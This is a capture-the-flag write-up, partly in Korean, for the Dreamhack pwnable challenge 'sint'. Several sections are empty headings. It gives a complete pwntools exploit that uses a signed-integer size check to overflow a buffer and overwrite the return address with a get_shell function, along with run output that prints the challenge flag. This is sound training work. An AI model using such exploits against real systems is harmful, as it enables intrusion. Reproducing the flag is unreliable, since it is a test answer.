# Dreamhack: sint Write-up

## 1. Problem Overview
- **Category:** Pwnable
- **Difficulty:** Level 1
- **Tool:** IDA Free, VS Code (Python), Pwndbg
- **Description:** signed integer 취약점을 이용해 oversized read()를 발생시키고 셸을 획득하는 문제

## 2. Static Analysis (정적 분석)



## 3. Solution & Dynamic Analysis (동적 분석)

### RET Overwrite



### Dynamic Analysis

### Full Solver Code
```python
from pwn import *

# 바이너리 아키텍처 설정 (32bit)
context.arch = 'i386'

# 드림핵 원격 서버 연결
p = remote('host3.dreamhack.games', 9075)

# Size 입력 단계
# size = 0 을 넣어 조건문을 우회하고
# read(0, buf, size-1) -> read(..., -1) 이 되도록 유도
p.sendlineafter(b"Size: ", b"0")

# buf[256] 이후 saved frame pointer 크기
sfp_size = 4

# buf 시작부터 saved frame pointer까지 거리
buf_to_sfp = 0x100   # 256 bytes

# 호출할 함수 주소 (get_shell)
target_addr = 0x8048659

# payload 구성
# buf(256) + saved ebp(4) 를 채운 뒤
# return address를 get_shell 주소로 overwrite
payload = b'A' * (sfp_size + buf_to_sfp)
payload += p32(target_addr)

# Data 입력 단계에서 payload 전송
p.sendlineafter(b"Data: ", payload)

# 쉘 획득 후 interactive 모드로 전환
p.interactive()
```

## 4. Results
```bash
dreamhack@dongyeon:/mnt/f/dream$ python3 p.py 
[+] Opening connection to host3.dreamhack.games on port 9075: Done
[*] Switching to interactive mode
$ ls
flag
sint
$ cat flag
DH{d66e84c453b960cfe37780e8ed9d70ab}$  
```

## 5. Thoughts













